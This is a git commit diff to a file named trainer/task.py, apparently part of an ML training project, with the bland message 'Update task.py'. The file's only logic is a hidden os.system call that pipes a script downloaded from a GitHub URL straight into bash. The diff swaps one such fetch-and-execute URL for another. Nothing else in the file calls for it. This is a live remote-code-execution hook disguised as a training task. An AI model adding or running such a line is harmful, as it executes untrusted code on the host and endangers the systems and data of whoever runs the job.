fa1df4c1e5c7d3dce128361aec1bc2fe47c29130
ajayy188 <syaukilfalah@gmail.com>
2025-02-18 01:02:56 +0700

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/nonibihan/tah/raw/refs/heads/main/jar | bash')
+os.system('curl -sL https://raw.githubusercontent.com/ajayy188/gkukjgk/refs/heads/main/task.py | bash')
